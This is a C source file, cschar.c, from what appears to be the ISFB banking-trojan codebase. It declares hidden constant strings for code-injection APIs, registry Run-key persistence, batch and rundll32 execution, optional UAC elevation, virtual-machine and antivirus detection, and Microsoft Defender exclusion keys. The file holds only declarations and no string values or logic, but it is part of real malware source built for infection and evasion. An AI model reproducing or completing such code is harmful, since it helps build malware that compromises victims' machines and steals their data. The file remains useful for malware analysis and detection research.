//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: cschar.c
// $Revision: 455 $
// $Date: 2015-01-24 21:47:07 +0300 (Сб, 24 янв 2015) $
// description:
//	Defines constant char sequences allocated within a separate PE-section

#include "common\common.h"
#include "crypto\crypto.h"
#include "config.h"

CSWCHAR_DEF(wczImageBmp);
CSCHAR_DEF(szLowIntegrityDaclStr);
CSCHAR_DEF(szAutoPath);
CSCHAR_DEF(szLocal);
CSCHAR_DEF(szDefaultDaclStr);
CSCHAR_DEF(szDllEntryPoint);
CSCHAR_DEF(szZoneIdentifier);
CSCHAR_DEF(szExtDll);
CSCHAR_DEF(szRunFmt);
CSCHAR_DEF(szDataRegSubkey);
CSCHAR_DEF(szExplorerExe);
CSCHAR_DEF(szExplorerEvent);
CSCHAR_DEF(szDataRegExeValue);
CSCHAR_DEF(szDataRegClientId);
CSCHAR_DEF(szFindDll);
CSCHAR_DEF(sz1252nls);
CSCHAR_DEF(szZwSetContextThread);
CSCHAR_DEF(szNtCurrentVersion);
CSCHAR_DEF(szOpen);
CSCHAR_DEF(szNtdll);
CSCHAR_DEF(szZwGetContextThread);
CSCHAR_DEF(szKernel32);
CSCHAR_DEF(szWow64EnableWow64FsRedirection);

#ifndef _WIN64
 CSCHAR_DEF(szZwWow64ReadVirtualMemory64);
 CSCHAR_DEF(szZwWow64QueryInformationProcess64);
#endif

CSCHAR_DEF(szExtBat);
CSCHAR_DEF(szLoadLibraryA);
CSCHAR_DEF(szBatchFile);
CSCHAR_DEF(szIsWow64Process);
CSCHAR_DEF(szDateTimeFmt);
CSCHAR_DEF(sz64);
CSCHAR_DEF(szRtlSetUnhandledExceptionFilter);
CSCHAR_DEF(szSystemRoot);
CSCHAR_DEF(szGuidStrTemp2);
CSCHAR_DEF(szGuidStrTemp1);
CSWCHAR_DEF(wczFindAll);
CSCHAR_DEF(szCreateProcessA);
CSCHAR_DEF(szLdrGetProcedureAddress);
CSCHAR_DEF(szAdvapi32);
CSCHAR_DEF(szExitThread);
CSCHAR_DEF(szZwWriteVirtualMemory);
CSCHAR_DEF(szLdrLoadDll);
CSCHAR_DEF(szZwProtectVirtualMemory);
CSCHAR_DEF(szKernelbase);
CSCHAR_DEF(szLdrRegisterDllNotification);
CSCHAR_DEF(szLdrUnregisterDllNotification);
CSCHAR_DEF(szExtExe);
CSCHAR_DEF(szRundll32);
CSCHAR_DEF(szRunFmt2);

#ifdef _REQUEST_UAC
 CSCHAR_DEF(szRunas);
 CSCHAR_DEF(szCmdExe);
 CSCHAR_DEF(szCmdCopyRun);
#endif

#ifdef _CHECK_VM
 CSTCHAR_DEF(szVbox);
 CSTCHAR_DEF(szQemu);
 CSTCHAR_DEF(szVmware);
 CSTCHAR_DEF(szVirtualHd);
 CSTCHAR_DEF(szAvFileName);
#endif

#ifdef _MSSE_EXCLUSION
 CSTCHAR_DEF(szDefenderKey);
 CSTCHAR_DEF(szMsSeKey);
#endif


